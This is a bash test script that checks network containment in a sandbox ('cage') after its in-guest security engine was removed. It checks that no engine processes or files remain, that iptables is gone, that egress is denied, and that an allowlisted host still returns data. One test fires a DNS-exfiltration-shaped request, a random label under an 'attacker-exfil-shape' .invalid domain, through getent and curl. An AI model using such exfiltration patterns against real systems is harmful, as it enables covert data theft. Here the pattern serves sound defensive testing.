#!/usr/bin/env bash
# tests/test-msb-engine-deletion-effect-probes.sh -- LIVE effect-based proof
# that the in-cage security engine (router / egress-policy / DNS-exfil
# heuristic / iptables firewall init / mediator launch machinery) is
# ABSENT from a post-deletion cage, and that containment still holds via
# msb primitives alone (rip-cage-3vj2, S4 of the msb migration epic
# rip-cage-tsf2, ADR-029 D2).
#
# Applies the GENERATOR's emitted flags DIRECTLY via `msb run` (NOT through
# rc's create verb -- that's S6's job; this is the S4<->S6 non-circularity
# pattern documented in docs/2026-07-10-tsf2-decomposition.md). This keeps
# S4 independently verifiable before S6's lifecycle verbs exist.
#
# Per the msb fake-accept confound (bd memory
# msb-netstack-fake-accepts-tcp-connect-not-egress) every reachability claim
# here is real bidirectional application data, and every deny claim is
# zero-bytes evidence -- never connect()-success or exit-0 alone.
#
# Coverage (mirrors the bead's acceptance criteria):
#   ABS1  no engine process is running in the booted cage (ps aux has no
#         rip_cage_router.py / rip_cage_dns.py / rip_cage_egress.py /
#         rip-proxy-owned process) [criterion 1, process-absence half]
#   ABS2  no engine file is present ANYWHERE in the guest filesystem (not
#         just absent from the one baked path -- a whole-fs sweep) [criterion 1]
#   ABS3  the iptables binary itself is absent from the guest (the firewall
#         engine's core dependency is gone, not merely unused) [criterion 1]
#   DENY  a denied host (plain, non-exfil-shaped) yields ZERO bytes on the
#         SAME cage [criterion 1]
#   DNS   a DNS-exfil-shaped query (long random subdomain label under a
#         non-allowlisted apex) fails to RESOLVE (getent exit non-zero, no
#         IP) and the HTTP attempt over it yields ZERO bytes -- refused at
#         the resolver before egress [criterion 1]
#   POS   the SAME cage's allowed host returns REAL bidirectional
#         application data (positive control, guards the dead-network
#         confound) [criterion 1b]
#
# NEEDS_CONTAINER + NEEDS_MSB + a live network path to example.com /
# icanhazip.com. Self-skips (exit 0, SKIP: ...) when any prerequisite is
# missing -- never fakes a PASS.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="${SCRIPT_DIR}/.."
GEN="${REPO_ROOT}/cli/lib/msb_flags.sh"
IMAGE="rip-cage:latest"
RUN_ID="$$"
FAILURES=0
TOTAL=0

pass() { TOTAL=$((TOTAL + 1)); echo "PASS  [$TOTAL] $1"; }
fail() { TOTAL=$((TOTAL + 1)); echo "FAIL  [$TOTAL] $1 -- ${2:-}"; FAILURES=$((FAILURES + 1)); }

if ! command -v jq >/dev/null 2>&1; then
  echo "SKIP: jq not available -- skipping $(basename "$0")"
  exit 0
fi
if ! command -v msb >/dev/null 2>&1; then
  echo "SKIP: msb not available -- skipping $(basename "$0")"
  exit 0
fi
if ! msb image list --format json >/dev/null 2>&1; then
  echo "SKIP: msb not responsive -- skipping $(basename "$0")"
  exit 0
fi
if ! msb image list --format json 2>/dev/null | grep -qF "\"reference\": \"${IMAGE}\""; then
  echo "SKIP: ${IMAGE} not loaded into msb -- skipping $(basename "$0") (run: rc build, then msb load)"
  exit 0
fi

# shellcheck disable=SC1090
source "$GEN"

CAGE="3vj2-engine-deletion-probe-${RUN_ID}"

cleanup() {
  msb remove -f "$CAGE" >/dev/null 2>&1 || true
  rm -f /tmp/3vj2-*.err
}
trap cleanup EXIT

echo ""
echo "=== Setup: boot a cage from S2's generator flags directly (msb run), allowed_hosts=[example.com] ==="
CFG='{"allowed_hosts": ["example.com"]}'
mapfile -t FLAGS < <(_msb_flags_generate "$CFG")
if [[ "${#FLAGS[@]}" -gt 0 ]]; then
  pass "setup: generator produced flags for allowed_hosts config"
else
  fail "setup: generator produced no flags" ""
fi

if msb run -d --name "$CAGE" --replace "${FLAGS[@]}" "$IMAGE" -- sleep 300 >/tmp/3vj2-boot.err 2>&1; then
  pass "setup: cage boots from generator-emitted flags (post-deletion image)"
else
  fail "setup: cage failed to boot" "$(cat /tmp/3vj2-boot.err)"
  echo ""
  echo "=== test-msb-engine-deletion-effect-probes.sh: ${FAILURES}/${TOTAL} failure(s) (aborting -- boot failed) ==="
  exit 1
fi

# ===========================================================================
# ABS1: no engine process running
# ===========================================================================
echo ""
echo "=== ABS1: no engine process (router/dns/egress/rip-proxy) running in-guest ==="
ABS1_PS=$(msb exec "$CAGE" -- ps aux 2>/tmp/3vj2-ps.err)
if [[ -n "$ABS1_PS" ]]; then
  pass "ABS1 setup: captured a real non-empty process table (positive sentinel the probe itself works)"
else
  fail "ABS1 setup: ps aux returned nothing -- cannot assert absence against an empty/broken probe" "$(cat /tmp/3vj2-ps.err)"
fi
ABS1_MATCH=$(printf '%s\n' "$ABS1_PS" | grep -Ei 'rip_cage_router|rip_cage_dns|rip_cage_egress|rip-proxy|init-firewall|init-mediator' || true)
if [[ -z "$ABS1_MATCH" ]]; then
  pass "ABS1: no engine process (rip_cage_router.py / rip_cage_dns.py / rip_cage_egress.py / rip-proxy / init-firewall.sh / init-mediator.sh) found in the real process table"
else
  fail "ABS1: an engine process is still present" "$ABS1_MATCH"
fi

# ===========================================================================
# ABS2: no engine file anywhere in the guest filesystem (whole-fs sweep,
# not just the one baked path -- proves absence, not dormancy)
# ===========================================================================
echo ""
echo "=== ABS2: no engine file anywhere in the guest filesystem (whole-fs sweep) ==="
ABS2_OUT=$(msb exec "$CAGE" -- sh -c "find / -xdev \( -iname 'rip_cage_router*' -o -iname 'rip_cage_dns*' -o -iname 'rip_cage_egress*' -o -iname 'init-firewall.sh' -o -iname 'init-mediator.sh' -o -iname 'rip-proxy-start.sh' -o -iname 'rip-dns-start.sh' \) 2>/dev/null" 2>/dev/null)
if [[ -z "$ABS2_OUT" ]]; then
  pass "ABS2: whole-guest-filesystem sweep finds NO engine file anywhere (router/dns/egress .py, init-firewall.sh, init-mediator.sh, rip-*-start.sh all absent)"
else
  fail "ABS2: an engine file is still present somewhere in the guest filesystem" "$ABS2_OUT"
fi

# ===========================================================================
# ABS3: iptables binary itself is absent (the firewall engine's core
# dependency is gone, not merely unused -- proves the Dockerfile no longer
# installs it, not just that init-firewall.sh wasn't run)
# ===========================================================================
echo ""
echo "=== ABS3: iptables binary absent from the guest (firewall engine's dependency, not just its script) ==="
ABS3_RC=0
msb exec "$CAGE" -- sh -c 'command -v iptables' >/dev/null 2>&1 || ABS3_RC=$?
if [[ "$ABS3_RC" -ne 0 ]]; then
  pass "ABS3: 'iptables' binary is absent from PATH in-guest (exit ${ABS3_RC}) -- the firewall engine's package dependency is gone"
else
  fail "ABS3: iptables binary is still present in-guest" "command -v iptables succeeded"
fi

# ===========================================================================
# DENY: a plain denied host (not in allowed_hosts) yields ZERO bytes
# ===========================================================================
echo ""
echo "=== DENY: plain denied host (icanhazip.com, not allowlisted) -> ZERO bytes ==="
DENY_OUT=$(msb exec "$CAGE" -- sh -c 'curl -s --max-time 8 http://icanhazip.com/' 2>/tmp/3vj2-deny.err)
if [[ -z "$DENY_OUT" ]]; then
  pass "DENY: denied host (icanhazip.com) returned ZERO bytes (not connect-success)"
else
  fail "DENY: expected zero bytes from denied host" "got: '${DENY_OUT}'"
fi

# ===========================================================================
# DNS: a DNS-exfil-shaped query (long random label under a non-allowlisted
# apex, the classic exfiltration shape) is refused AT THE RESOLVER -- fails
# to resolve at all, before any egress attempt.
# ===========================================================================
echo ""
echo "=== DNS: DNS-exfil-shaped query refused at the resolver before egress ==="
EXFIL_LABEL=$(head -c 64 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-z0-9' | head -c 48)
if [[ -z "$EXFIL_LABEL" ]]; then
  EXFIL_LABEL="fallbackexfillabelnotrandomxyz123456789"
fi
EXFIL_HOST="${EXFIL_LABEL}.attacker-exfil-shape-${RUN_ID}.invalid"

DNS_RESOLVE_RC=0
DNS_RESOLVE_OUT=$(msb exec "$CAGE" -- sh -c "getent hosts '${EXFIL_HOST}'" 2>/tmp/3vj2-dns-resolve.err) || DNS_RESOLVE_RC=$?
if [[ "$DNS_RESOLVE_RC" -ne 0 && -z "$DNS_RESOLVE_OUT" ]]; then
  pass "DNS resolver refusal: the exfil-shaped subdomain (${EXFIL_LABEL:0:12}...) FAILED to resolve (getent exit ${DNS_RESOLVE_RC}, no address) -- refused at the resolver, before any egress attempt"
else
  fail "DNS: expected DNS resolution of the exfil-shaped subdomain to fail" "rc=${DNS_RESOLVE_RC} out='${DNS_RESOLVE_OUT}'"
fi

DNS_HTTP_OUT=$(msb exec "$CAGE" -- sh -c "curl -s --max-time 8 'http://${EXFIL_HOST}/'" 2>/tmp/3vj2-dns-http.err)
if [[ -z "$DNS_HTTP_OUT" ]]; then
  pass "DNS: the HTTP attempt over the unresolvable exfil-shaped host returned ZERO bytes"
else
  fail "DNS: expected zero bytes from the unresolvable exfil-shaped host" "got: '${DNS_HTTP_OUT}'"
fi

# ===========================================================================
# POS: positive control on the SAME cage -- an allowed host returns REAL
# bidirectional application data, ruling out the dead-network confound.
# ===========================================================================
echo ""
echo "=== POS (criterion 1b, positive control): allowed host (example.com) returns REAL data on the SAME cage ==="
POS_OUT=$(msb exec "$CAGE" -- sh -c 'curl -s --max-time 10 http://example.com/' 2>/tmp/3vj2-pos.err)
if [[ "$POS_OUT" == *"Example Domain"* ]]; then
  pass "POS: allowed host (example.com) returned REAL application data (matched known page content 'Example Domain') on the SAME cage that denied icanhazip.com and the DNS-exfil-shaped host -- msb is selectively enforcing, not dead-networked"
else
  fail "POS: expected real 'Example Domain' content from the allowed host" "got: '${POS_OUT}' stderr: $(cat /tmp/3vj2-pos.err)"
fi

echo ""
if (( FAILURES > 0 )); then
  echo "=== test-msb-engine-deletion-effect-probes.sh: ${FAILURES}/${TOTAL} failure(s) ==="
  exit 1
fi
echo "=== test-msb-engine-deletion-effect-probes.sh: all ${TOTAL} tests passed ==="
